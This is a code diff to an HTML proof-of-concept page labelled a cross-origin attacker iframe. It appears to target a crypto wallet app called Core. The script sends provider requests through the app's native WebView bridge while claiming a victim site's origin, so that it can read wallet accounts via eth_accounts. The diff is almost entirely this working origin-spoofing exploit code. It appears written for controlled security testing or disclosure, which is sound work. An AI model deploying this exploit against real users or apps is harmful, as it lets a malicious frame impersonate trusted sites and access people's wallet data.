@@ -4,11 +4,9 @@
 Cross-origin attacker iframe.
 
 <script>
-const params =
-  new URLSearchParams(location.search);
-
 const victimOrigin =
-  params.get('victimOrigin');
+  new URLSearchParams(location.search)
+    .get('victimOrigin');
 
 if (
   !victimOrigin ||
@@ -18,32 +16,32 @@ if (
 }
 
 
-/*
- * Send a provider request directly through
- * Core's native bridge.
- *
- * Actual frame origin = Origin B
- * Claimed origin      = Origin A
- */
-function nativeRequest(id, method) {
-  const wrapper = JSON.stringify({
+function nativeRequest(id) {
+
+  const message = JSON.stringify({
     method: 'provider_request',
 
     payload: JSON.stringify({
       id,
 
+      /*
+       * Actual sender = Origin B
+       * Claimed origin = Origin A
+       */
       origin: victimOrigin,
 
       request: {
-        method,
+        method: 'eth_accounts',
         params: []
       }
     })
   });
 
+
   const bridge =
     window.webkit?.messageHandlers
       ?.ReactNativeWebView;
+
 
   if (!bridge?.postMessage) {
     throw new Error(
@@ -51,50 +49,38 @@ function nativeRequest(id, method) {
     );
   }
 
-  bridge.postMessage(wrapper);
+
+  bridge.postMessage(message);
 }
 
 
-/*
- * Observe native responses that Core dispatches
- * back into the top-level document.
- *
- * We use a known ID only for this controlled test.
- */
-const TEST_ID = 733731;
-
-
-/*
- * Ask the parent to observe the corresponding
- * Core callback result.
- *
- * We cannot directly read Origin A's JS state,
- * so the test result is reported by A.
- */
 addEventListener('message', event => {
-  if (event.source !== parent)
+
+  if (event.source !== parent) return;
+  if (event.origin !== victimOrigin) return;
+
+  if (event.data?.type !== 'READ_ACCOUNTS')
     return;
 
-  if (event.origin !== victimOrigin)
-    return;
-
-  if (event.data?.type !== 'READ_ACCOUNTS_AS_A')
-    return;
 
   nativeRequest(
-    TEST_ID,
-    'eth_accounts'
+    event.data.id
   );
 
-  parent.postMessage({
-    type: 'ATTACK_SENT',
-    id: TEST_ID
-  }, victimOrigin);
+
+  parent.postMessage(
+    {
+      type: 'REQUEST_SENT'
+    },
+    victimOrigin
+  );
 });
 
 
 parent.postMessage(
-  { type: 'READY' },
+  {
+    type: 'READY'
+  },
   victimOrigin
 );
 </script>
